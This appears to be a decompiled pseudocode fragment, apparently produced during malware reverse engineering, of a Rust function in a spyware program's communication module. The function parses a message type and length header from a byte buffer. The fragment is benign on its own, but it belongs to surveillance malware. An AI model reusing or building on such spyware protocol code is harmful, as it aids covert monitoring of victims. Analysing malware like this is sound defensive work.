__int64 __fastcall spyware::communication::serialization::extract_msg_type_and_length(int a1)
{
  int v2; // [rsp+4h] [rbp-34h] BYREF
  _QWORD v3[3]; // [rsp+8h] [rbp-30h] BYREF
  _BYTE v4[24]; // [rsp+20h] [rbp-18h] BYREF

  v2 = a1;
  v3[0] = <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(&v2);
  v3[1] = 4LL;
  v3[2] = 0LL;
  byteorder::io::ReadBytesExt::read_u32(v4, v3);
  return (unsigned int)core::result::Result<T,E>::unwrap(v4);
}